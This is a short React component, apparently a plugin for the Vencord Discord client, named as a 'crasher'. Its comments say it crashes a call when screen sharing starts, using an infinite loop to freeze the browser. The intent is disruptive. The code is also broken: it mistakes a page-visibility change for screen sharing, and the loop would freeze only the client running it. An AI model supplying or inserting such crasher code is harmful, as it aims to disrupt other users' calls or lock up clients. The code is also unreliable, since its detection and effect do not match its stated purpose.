import { useState, useEffect } from 'react';

const VencordCrasherVc = () => {
  const [isScreenSharing, setIsScreenSharing] = useState(false);

  useEffect(() => {
    // Listen for screen sharing events
    document.addEventListener('visibilitychange', () => {
      if (document.visibilityState === 'hidden') {
        setIsScreenSharing(true);
      } else {
        setIsScreenSharing(false);
      }
    });

    // Crash the call when screen sharing starts
    if (isScreenSharing) {
      const crashInterval = setInterval(() => {
        // Create an infinite loop that will crash the browser
        while (true) {}
      }, 1000);
      return () => clearInterval(crashInterval);
    }
  }, [isScreenSharing]);

  return null;
};

export default VencordCrasherVc;
